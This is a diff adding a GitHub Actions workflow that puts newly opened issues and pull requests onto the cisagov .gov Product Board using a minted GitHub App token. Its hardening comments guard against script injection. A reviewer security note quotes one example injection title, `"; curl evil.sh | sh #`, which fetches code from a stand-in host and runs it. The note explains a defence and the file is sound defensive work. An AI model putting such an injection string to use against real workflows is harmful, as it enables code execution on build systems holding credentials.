@@ -1,0 +1,210 @@
+# .github/workflows/add-to-project.yml
+#
+# Adds newly opened issues and pull requests in this repository to the
+# .gov Product Board: https://github.com/orgs/cisagov/projects/26
+#
+# Replaces the built-in "Auto-add to project" workflow, which is limited to one
+# repository on the free plan (that slot is used by cisagov/manage.get.gov).
+#
+# Authenticates as a GitHub App installed on the cisagov org. The App's private
+# key is the only long-lived credential. The token this workflow uses is minted
+# per run, lives at most one hour, and is revoked automatically when the job
+# ends. Setup and ownership: see docs/runbooks/project-board-automation.md
+#
+# SECURITY NOTE FOR REVIEWERS
+# ---------------------------
+# This workflow holds credentials and is triggerable by anyone on the internet,
+# because anyone can open an issue on a public repository and the `issues` event
+# runs with secrets available. It is safe ONLY because it never executes
+# anything it did not ship with, and never interpolates attacker-controlled
+# strings. If you edit this file, preserve all three invariants:
+#
+#   1. No `actions/checkout` and no execution of anything from a PR branch.
+#   2. No `${{ github.event.* }}` interpolation inside a `run:` block. Values
+#      reach the shell through `env:` only, so an issue title of
+#      `"; curl evil.sh | sh #` is inert.
+#   3. Only GitHub-generated fields are read (`node_id`), never user-authored
+#      text.
+#
+# `pull_request` is used rather than `pull_request_target`, and PRs from forks
+# are skipped by the job-level `if:` below. Fork PRs do not receive secrets on
+# `pull_request`, so without the guard every community PR would produce a red
+# failed run. `pull_request_target` would make them work, but it is the trigger
+# with the worst footgun reputation in Actions and it is not worth adopting for
+# a board convenience.
+#
+# `.github/workflows/` should carry a CODEOWNERS entry so changes here require
+# security review.
+
+name: Add new issues and PRs to the .gov Product Board
+
+on:
+  issues:
+    # `transferred` is intentionally omitted: on transfer the item receives a
+    # new node ID in the destination repo, and it is unverified whether the
+    # event fires here with the old or the new ID. Add it only after testing.
+    types: [opened, reopened]
+
+  # Not pull_request_target -- see the security note above. Fork PRs are
+  # filtered out by the job-level `if:` rather than failing noisily.
+  pull_request:
+    types: [opened, reopened]
+
+  # Manual path: add an existing issue or PR by number (backfill, or smoke-test
+  # the App credentials without opening a throwaway issue).
+  workflow_dispatch:
+    inputs:
+      item_number:
+        description: "Existing issue or PR number in this repo"
+        required: true
+        type: string
+
+  # Reconciliation sweep. Event-driven adds fail silently in practice -- an
+  # expired key, a GitHub incident, or a rate limit drops items on the floor
+  # with nobody watching the Actions tab. This re-adds anything from the last
+  # week; the mutation is idempotent, so re-adds are free.
+  schedule:
+    - cron: "17 6 * * 1"
+
+# The automatic GITHUB_TOKEN cannot read or write organization-level ProjectsV2,
+# so it is not used at all. Zeroing this block also drops the default
+# GITHUB_TOKEN permission set, which this workflow has no use for.
+permissions: {}
+
+env:
+  # Node ID of the .gov Product Board (org project 26). Hardcoded rather
+  # than looked up each run: it never changes, and a lookup is one more network
+  # call that can fail. Re-derive it with:
+  #   gh api graphql -f query='{organization(login:"cisagov"){projectV2(number:26){id}}}'
+  PROJECT_ID: "PVT_kwDOARrkq84AEeXk"
+
+jobs:
+  add-to-project:
+    name: Add item to the board
+    # Skip PRs opened from a fork. They do not receive secrets on
+    # `pull_request`, so the token step would fail and leave a red run on every
+    # outside contribution. Issues are unaffected: they always run in this
+    # repository with secrets, whoever opened them.
+    if: >-
+      github.event_name != 'pull_request' ||
+      github.event.pull_request.head.repo.full_name == github.repository
+    # Pinned rather than ubuntu-latest so runner image rollouts cannot change
+    # the behaviour of preinstalled tooling underneath this workflow.
+    runs-on: ubuntu-24.04
+    timeout-minutes: 5
+    steps:
+      # Mints a short-lived installation token and revokes it in its post step.
+      # The token cannot exceed the App's own permissions, which are three
+      # read/write grants -- see the runbook.
+      #
+      # Pinned to a full commit SHA. Dependabot bumps the SHA and rewrites the
+      # trailing version comment; never replace the SHA with a floating tag.
+      - name: Mint a short-lived App token
+        id: token
+        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3.2.0
+        with:
+          app-id: ${{ vars.PROJECT_BOT_APP_ID }}
+          private-key: ${{ secrets.PROJECT_BOT_PRIVATE_KEY }}
+          owner: ${{ github.repository_owner }}
+
+      - name: Collect the node IDs to add
+        env:
+          GH_TOKEN: ${{ steps.token.outputs.token }}
+          EVENT_NAME: ${{ github.event_name }}
+          EVENT_ISSUE_ID: ${{ github.event.issue.node_id }}
+          EVENT_PR_ID: ${{ github.event.pull_request.node_id }}
+          INPUT_NUMBER: ${{ inputs.item_number }}
+          REPO: ${{ github.repository }}
+        run: |
+          set -euo pipefail
+          : > ids.txt
+
+          case "$EVENT_NAME" in
+            # The webhook payload already carries the node ID, so the hot path
+            # makes no API call at all before the mutation.
+            issues)
+              echo "$EVENT_ISSUE_ID" >> ids.txt
+              ;;
+            pull_request)
+              echo "$EVENT_PR_ID" >> ids.txt
+              ;;
+            workflow_dispatch)
+              # INPUT_NUMBER is operator-supplied free text that ends up in an
+              # API request, so reject anything that is not a bare integer.
+              case "$INPUT_NUMBER" in
+                ''|*[!0-9]*) echo "::error::item_number must be a positive integer, got: ${INPUT_NUMBER}"; exit 1 ;;
+              esac
+              # issueOrPullRequest resolves either kind in one call, so there is
+              # no need to detect which it is first.
+              gh api graphql -f query='
+                query($owner: String!, $name: String!, $number: Int!) {
+                  repository(owner: $owner, name: $name) {
+                    issueOrPullRequest(number: $number) {
+                      ... on Issue { id }
+                      ... on PullRequest { id }
+                    }
+                  }
+                }' \
+                -f owner="${REPO%/*}" -f name="${REPO#*/}" -F number="$INPUT_NUMBER" \
+                --jq '.data.repository.issueOrPullRequest.id' >> ids.txt
+              ;;
+            schedule)
+              # Everything created in the last eight days. The window overlaps
+              # the weekly cadence because search is eventually consistent.
+              # isCrossRepository drops fork PRs, so the sweep does not re-add
+              # what the event path deliberately skipped. Issues have no such
+              # field, so `!= true` keeps them.
+              gh api graphql -f query='
+                query($q: String!) {
+                  search(query: $q, type: ISSUE, first: 100) {
+                    nodes {
+                      ... on Issue { id }
+                      ... on PullRequest { id isCrossRepository }
+                    }
+                  }
+                }' \
+                -f q="repo:${REPO} created:>=$(date -u -d '8 days ago' +%Y-%m-%d)" \
+                --jq '.data.search.nodes[] | select(.isCrossRepository != true) | .id' >> ids.txt
+              ;;
+            *)
+              echo "::error::Unsupported event: ${EVENT_NAME}"
+              exit 1
+              ;;
+          esac
+
+          sed -i '/^$/d; /^null$/d' ids.txt
+          count="$(wc -l < ids.txt)"
+          echo "Resolved ${count} item(s)."
+          if [ "$count" -eq 0 ] && [ "$EVENT_NAME" != "schedule" ]; then
+            echo "::error::Could not resolve any node ID for event ${EVENT_NAME}."
+            exit 1
+          fi
+
+      - name: Add the items to the board
+        env:
+          GH_TOKEN: ${{ steps.token.outputs.token }}
+        run: |
+          set -euo pipefail
+          failed=0
+          while read -r content_id; do
+            # addProjectV2ItemById is idempotent: if the item is already on the
+            # board, the existing item ID comes back instead of a duplicate.
+            if item_id="$(gh api graphql -f query='
+                mutation($project: ID!, $content: ID!) {
+                  addProjectV2ItemById(input: {projectId: $project, contentId: $content}) {
+                    item { id }
+                  }
+                }' \
+              -f project="$PROJECT_ID" -f content="$content_id" \
+              --jq '.data.addProjectV2ItemById.item.id')"; then
+              echo "ok  ${content_id} -> ${item_id}"
+            else
+              echo "::warning::Failed to add ${content_id}"
+              failed=$((failed + 1))
+            fi
+          done < ids.txt
+          if [ "$failed" -gt 0 ]; then
+            echo "::error::${failed} item(s) could not be added."
+            exit 1
+          fi
+          echo "Added $(wc -l < ids.txt) item(s) to the .gov Product Board." >> "$GITHUB_STEP_SUMMARY"
